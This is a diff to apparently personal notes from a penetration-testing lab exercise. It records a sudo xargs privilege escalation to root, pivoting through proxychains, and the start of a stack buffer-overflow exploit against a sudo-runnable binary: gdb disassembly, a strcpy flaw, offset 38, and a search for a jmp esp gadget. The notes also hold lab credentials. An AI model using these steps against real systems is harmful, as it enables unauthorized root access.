@@ -40,8 +40,32 @@ sudo xargs -a /dev/null sh
 whoami  #root
 cd root
 found Important.txt  and svch0st.sh   which contained flags
+xfreerdp /v:10.50.28.205 /u:student /p:password /size:1920x1000 +clipboard  #just example
+
+ssh into 192.168.28.10 with user Kmichae
+sudo -l 
+/home/Kmichae/exploit_this  #found through sudo
+scp it over to linops
+proxychains scp Kmichae@192.168.28.10:/home/Kmichae/exploit_this .
+gdb ./exploit_this
+pdisass main
+pdisass test
+found that strcpy is the vuln function in this binary
+created lin_ex.py in order to start on buff overflow of exploit_this
+by using the 200 string from wiremask.eu i found that the offset is 38
+put that into the script
+env - gdb exploit_this
+show env 
+unset env LINES
+unset env COLUMNS
+run $(python2 lin_ex.py)
+info proc map
+0xf7de1000, 0xf7ffe000
+find /b 0xf7de1000, 0xf7ffe000, 0xff, 0xe4
+
+find /b 0xf7ded000, 0xf7ffe000, 0xff, 0xe4
 
 
-
+user for 192.168.28.19 is Msmith
 
 
